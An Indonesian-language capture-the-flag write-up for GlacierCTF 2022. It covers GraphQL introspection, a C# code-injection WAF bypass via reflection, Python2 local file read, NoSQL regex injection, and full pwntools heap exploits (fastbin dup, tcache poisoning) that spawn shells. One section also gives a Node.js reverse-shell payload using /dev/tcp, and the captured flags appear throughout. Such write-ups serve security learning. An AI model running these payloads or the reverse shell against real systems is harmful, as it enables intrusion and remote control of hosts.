# web
---
## FlagCoin Stage 1

Diberikan website https://flagcoin.ctf.glacierctf.com/, dimana disitu kita melihat login page seperti berikut:

![](Pasted%20image%2020221127092045.png)

langsung saja kita intercept requestnya menggunakan burpsuite

![](Pasted%20image%2020221127092101.png)

ternyata dia menggunakana graphql untuk autentikasi loginnya

langsung saja kita cari teknik hack graphql di https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql

kita lihat schema dari graphql menggunakan payload berikut:
```json
{__schema{types{kind,name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}
```
hasil:
```json
...snip..
{"kind":"OBJECT","name":"Mutation","fields":[{"name":"login","args":[{"name":"username","description":null,"type":{"name":"String","kind":"SCALAR","ofType":null}},{"name":"password","description":null,"type":{"name":"String","kind":"SCALAR","ofType":null}}]},{"name":"register_beta_user","args":[{"name":"username","description":null,"type":{"name":"String","kind":"SCALAR","ofType":null}},{"name":"password","description":null,"type":{"name":"String","kind":"SCALAR","ofType":null}}]},{"name":"redeem","args":[{"name":"voucher","description":null,"type":{"name":"JSON","kind":"SCALAR","ofType":null}}]}]},
...snip...
```

Disitu ada name register beta user yang menerima argumen username dan password (kemungkinan digunakan untuk register user)

Dari situ kita tinggal membuat user baru

![](Pasted%20image%2020221127092221.png)

dan login menggunakan user tersebut

![](Pasted%20image%2020221127092240.png)

kita mendapatkan flagnya

## RCE as Service (Stage 1)

Diberikan web app, terdapat RCE yang disengaja pada endpoint `/rce`

![](Pasted%20image%2020221127092353.png)

pada file api_usage.md, kita diberikan contoh API:

```sh
curl --request POST \
  --url http://localhost:8002/rce \
  --header 'Content-Type: application/json' \
  --data '{
    "Data": ["Charmander", "Bulbasaur", "Bulbasaur"],
    "Query": "(data) => data.Select((d) => d == \"Bulbasaur\" ? \"Charmander\" : d)"
}'
```

Karena bisa kita bahwa query merupakan sintaks LINQ untuk C#, kita bisa berikan query seperti:

```c#
(data) => data.Select((d) => System.IO.File.ReadAllText(\"/flag.txt\")
```

untuk membaca flag 

Full payload: 

```http
POST /rce HTTP/2
Host: rce-as-a-service-1.ctf.glacierctf.com
Accept: */*
Content-Type: application/json
Content-Length: 106

{
    "Data": ["."],
    "Query": "(data) => data.Select((d) => System.IO.File.ReadAllText(\"/flag.txt\"))"
}
```

glacierctf{ARE_YOU_AN_3DG3L9RD?}

## RCE as Service (Stage 2)

Masih dengan source yang sama, namun kali ini diberikan waf dimana kita tidak boleh memasukkan query dengan kata "System.IO"
    
Disini langsung terlintas ide untuk menggunakan Reflection untuk membypass hal tersebut, karena pada dasarnya Reflection kita dapat melakukan mulai dari get class, get method sampai invoke method cukup dengan string untuk mencari class & method tersebut

Jadi disini intinya, kita bisa memasukkan hal seperti

```
"System." + "IO" + ".File"
```

Pada payload untuk membypass waf string "System.IO"
Untuk mendapatkan Type dari class System.IO, kita harus mencari terlebih dahulu AssemblyQualifiedName untuk class tersebut, oleh karena itu saya langsung mencoba mencari AssemblyQualifiedName pada RCE as Service stage 1 karena asumsi saya menggunakan versi .NET yang sama.

Berikut payload untuk mendapatkan AssemblyQualifiedName pada stage 1:

```http
POST /rce HTTP/2
Host: rce-as-a-service-1.ctf.glacierctf.com
Accept: */*
Content-Type: application/json
Content-Length: 109

{
    "Data": ["."],
    "Query": "(data) => data.Select((d) => typeof(System.IO.File).AssemblyQualifiedName)"
}
```

response:

```http
HTTP/2 200 OK
Date: Sat, 26 Nov 2022 08:52:41 GMT
Content-Type: application/json; charset=utf-8
Strict-Transport-Security: max-age=15724800; includeSubDomains

["System.IO.File, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e"]
```

Oke, karena kita sudah punya AssemblyQualifiedNamenya, kita bisa langsung rakit payloadnya seperti berikut:

```c#
var flag = ((string)(Type.GetType("System.IO.File, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e").GetMethod("ReadAllText", new[] { typeof(string) }).Invoke(null, new object[] { "/flag.txt" })));
```

untuk lakukan bypass pada waf `System.IO`, cukup jadikan payload seperti berikut:

```c#
var flag = ((string)(Type.GetType("System." + "IO" + ".File, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e").GetMethod("ReadAllText", new[] { typeof(string) }).Invoke(null, new object[] { "/flag.txt" })));
```

Full payload:

```http
POST /rce HTTP/2
Host: rce-as-a-service-2.ctf.glacierctf.com
Accept: */*
Content-Type: application/json
Content-Length: 312

{
    "Data": ["."],
    "Query": "(data) => data.Select((d) => ((string)(Type.GetType(\"System.\" + \"IO\" + \".File, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\").GetMethod(\"ReadAllText\", new[] { typeof(string) }).Invoke(null, new object[] { \"/flag.txt\" }))))"
}
```

glacierctf{L1V1N_ON_TH3_3DG3}

## Glacier Top News

Pada challenge ini kita diberikan source code. Pada source code itu menggunakan python2.

`glacier_webserver/api.py`
```python
...snip...
@app.route('/api/get_resource', methods=['POST'])
def get_resource():
    url = request.json['url']

    if(Filter.isBadUrl(url)):
        return 'Illegal Url Scheme provided', 500

    content = urlopen(url)
    return content.read(), 200
...snip...
```

Jadi vulnerabilitynya adalah LFI yang terdapat di fungsi urlopen(). Tapi disini ada Filter yang menghalangi

`glacier_webserver/utils.py`
```python
...snip...
class Filter:
    BAD_URL_SCHEMES = ['file', 'ftp', 'local_file']
    BAD_HOSTNAMES = ["google", "twitter", "githubusercontent", "microsoft"]

    @staticmethod
    def isBadUrl(url):
        return Filter.bad_schema(url)

    @staticmethod
    def bad_schema(url):
        scheme = url.split(':')[0]
        return scheme.lower() in Filter.BAD_URL_SCHEMES
...snip...
```

File diatas memblacklist beberapa url schema, tapi disini karena applikasinya menggunakan python2 kita tidak perlu menambakan file:// untuk membaca file local, melainkan hanya dengan /path/to/file biasa.

(referensi isu bisa dilihat disini: https://stackoverflow.com/questions/20558587/opening-local-file-works-with-urllib-but-not-with-urllib2)

berikut request yang saya buat untuk membaca file flag yang ada di environment variable

![](Pasted%20image%2020221127093038.png)

## Flag Coin Stage 2

Berbeda dengan pada Stage 1, di challenge ini kita diberikan source code dari challenge nya. TL;DR kita menggunakan teknik NoSQL injection pada voucher.code. Kita menggunakan regex untuk medapatkan voucher flagnya (referensi: https://book.hacktricks.xyz/pentesting-web/nosql-injection)

![](Pasted%20image%2020221127093345.png)

```http
POST /graphql HTTP/1.1
Host: localhost:4444
Content-Length: 214
Content-Type: application/json
Cookie: session=s%3Aasd.gBsc29mRZ6fGHG5eg9WQI3ZrT5QaIY9tw39SmfeNTq4
Connection: close

{"query":"\n        mutation($voucher: JSON!) { \n          redeem(voucher: $voucher) { \n            coins\n            message\n          } \n        }\n        ","variables":{"voucher":{"code":{"$regex":".*"}}}}
```


# pwn
---
## old dayz

libc 2.23, bug uaf + double free
exploitasi fastbin dup trus overwrite `__malloc_hook` ke one_gadget.

```python
from pwn import *

elf  = ELF("./old_patch", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def add(idx, sz):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'idx:',b'%d' % idx)
    p.sendlineafter(b'size:',b'%d' % sz)

def delete(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', b'%d' % idx)

def write(idx, data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', b'%d' % idx)
    p.sendlineafter(b'contents:', b'%s' % data)

def view(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'idx:', b'%d' % idx)
    p.recvuntil(b'data: ')
    return p.recvline()

# p = elf.process()
p = remote('pwn.glacierctf.com', 13377)
# get libc main_arena
# goes unsorted-bin
add(0, 0x80)
# victim chunk
add(1, 0x68)
# padding
add(2, 0x24)
delete(0)
leak_main_arena = u64(view(0)[:6].ljust(8, b'\x00'))
libc.address = leak_main_arena - (0x3c4000 + 0xb78)
log.info(f'leak main arena @ 0x{leak_main_arena:x}')
log.info(f'libc base @ 0x{libc.address:x}')
add(0, 0x80)

# uaf -> fastbin dup -> __malloc_hook into one_gadget
delete(1)
write(1, p64(libc.sym['__malloc_hook']-0x1b-8))
add(3, 0x68) # goes into fastbin list
add(4, 0x68) # goes into arbitrary here

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
one_gadget = libc.address + 0x4527a
write(4, b'X'*(0x1b-8) + p64(one_gadget))

# spawn shell
add(0,0)

p.interactive()
# glacierctf{pwn_1S_Th3_0nly_r3al_c4t3G0ry_4nyw4y}
```

## Break the Calculator

> jsfuck -> import "require" from process.mainModule -> rce from exec()
> https://kamil-kielczewski.github.io/small-jsfuck/
> https://hackmd.io/@hakatashi/ryLh2okDD

payload:

```js
process.mainModule.require("child_process").exec("bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1337 <&1'");
```

## Filer

binary no relro, no canary tapi pie enabled
terdapat bug overflow dimana saat menambahkan index 16 akan mengoverwrite value size index 0 & 1 ke value yg lebih besar

dari sini kita bisa edit metadata agar berukuran lebih besar untuk leak main_arena atau nge-create fake chunk buat tcache poisoning

leak bisa didapat dengan mengoverwrite _IO_2_1stdout dari leak address main_arena, oleh karena itu dibutuhkan setidaknya brute force dngan perbandingan 1/16

setelah didapatkan leak, kalkulasi libc base address, overwrite __free_hook ke system dngan uaf/tcache poisoning lewat bug overflow, panggil fungsi delete untuk mendapatkan shell 
referensi :
- https://github.com/ENOFLAG/writeups/blob/master/X-MASctf2019/Blindfolded.md
- https://vigneshsrao.github.io/posts/babytcache/

```python
from pwn import *

elf  = ELF("./FILE-er", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def add(idx, sz, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>',b'%d' % idx)
    p.sendlineafter(b'>',b'%d' % sz)
    p.sendafter(b'> ',b'%s' % data)

def edit(idx, data):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'>',b'%d' % idx)
    p.sendafter(b'> ',b'%s' % data)

def delete(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>',b'%d' % idx)

# brute force 1/16 to get a perfect libc address leak from overwriting _IO_2_1_stdout_
iter=0
while True:
    with context.local(log_level = 'error'):
        # p = elf.process()
        p = remote('172.17.0.2', 1337)
        # p = remote('pwn.glacierctf.com', 13376)
        try:
            # padding
            add(0, 0x70, b'padding')
            # this will overwrite size of index 0 & 1 (size index is 32 dword) into pointer heap of index 16
            # then ? obviously will overflow because the size/value of heap address is large than 0x18
            add(0, 0x18, b'A'*8)
            add(1, 0x18, b'A'*8)
            add(16, 0xffffffff+1, b'')
            add(15, 0x18, b'B'*8)

            # this will be overwritten
            add(3, 0x408, b'X'*8)
            add(4, 0x18, b'X'*8)
            # padding
            add(5, 0x18, b'X'*8)
            add(6, 0x18, b'X'*8)

            # this will overwrite index 16 then index 3 size
            edit(1, b'O'*0x18 +
                    # chunk 16 metadata
                    p64(0x21) +
                    # chunk 16 data
                    b'A'*0x18 +
                    # chunk 15 metadata
                    p64(0x21) +
                    # chunk 15 data
                    b'B'*0x18 +
                    # chunk 3 metadata
                    p64(0x431)
            )
            delete(3)
            add(0, 0x18, p16(0x16a0)) # this will point to _IO_2_1_stdout_
            add(16, 0xffffffff+1, b'')

            # tcache poisoning here
            delete(4)
            delete(0)

            # overwrite last nibble main_arena address to _IO_2_1_stdout_ address
            edit(1, b'0'*0x18 +
                    # chunk 16 metadata
                    p64(0x21) +
                    # chunk 16 data
                    b'A'*0x18 +
                    # chunk 15 metadata
                    p64(0x21) +
                    # chunk 15 data
                    b'B'*0x18 +
                    # chunk 3 metadata
                    p64(0x21) +
                    # chunk 3 data
                    b'\x00'*0x18 +
                    # chunk 4 metadata
                    p64(0x21) +
                    # chunk 4 data
                    p16(0xf6a0)
            )
            delete(15)

            # overwrite heap pointer to heap chunk that have _IO_2_1_stdout_ address
            edit(1, b'0'*0x18 +
                    # chunk 16 metadata
                    p64(0x21) +
                    # chunk 16 data
                    b'A'*0x18 +
                    # chunk 15 metadata
                    p64(0x21) +
                    # chunk 15 data
                    p8(0xb0)
            )
            add(4, 0x18, b'X') # popping chunk from fastbin freelist
            add(0, 0x18, b'X') # popping chunk from fastbin freelist

            # payload to overwrite _IO_2_1_stdout_ for leaking libc address
            payload = p64(0x0fbad1800)  
            payload += b'\0' * 0x18 
            payload += b'\0'

            # this will make size index 1 bigger
            add(1, 0, b'')
            add(16, 0xffffffff+1, b'')
            edit(1, payload)
            resp = p.recvline_contains(b'Success')

            # check if leaked content exist, if not then nibble byte brute force is incorrect
            if len(resp) > 8:
                print()
                print(resp)
                break
            else:
                raise Exception()
        except:
            iter+=1
            print('.', end='')
            p.close()
            pass

print()
log.success(f'found valid leak, total run {iter}x')
# print(p.pid,resp)
leak_addr = u64(resp[8:resp.find(b'\x7f\x00')+1].ljust(8, b'\x00'))
libc.address = leak_addr - libc.sym['_IO_2_1_stdin_']
log.info(f'_IO_2_1_stdin_ leak @ 0x{leak_addr:x}')
log.info(f'libc base @ 0x{libc.address:x}')

# overflow + uaf + tcache poison
add(0, 0x28, b'A'*8)
add(1, 0x28, b'B'*8)
add(2, 0x28, b'C'*8)
add(3, 0x28, b'/bin/sh\x00')
add(16, 0xffffffff+1, b'')
delete(0)
delete(2)
edit(1, b'X'*0x28 +
        p64(0x31) +
        p64(libc.sym['__free_hook'])
)
add(2, 0x28, b'X') # popping chunk from fastbin freelist
add(0, 0x28, p64(libc.sym['system'])) # overwrite __free_hook to system
# spawn shell
log.success('spawning shell!')
delete(3)
p.interactive()
# glacierctf{Now_1Mag1n3_L4t3st_L1bc?!}
```

# misc
---
## The Climber

1. foremost gambar
2. check pakek https://stegonline.georgeom.net/image
3. bawah pojok kanan nyempil

![](Pasted%20image%2020221127093304.png)

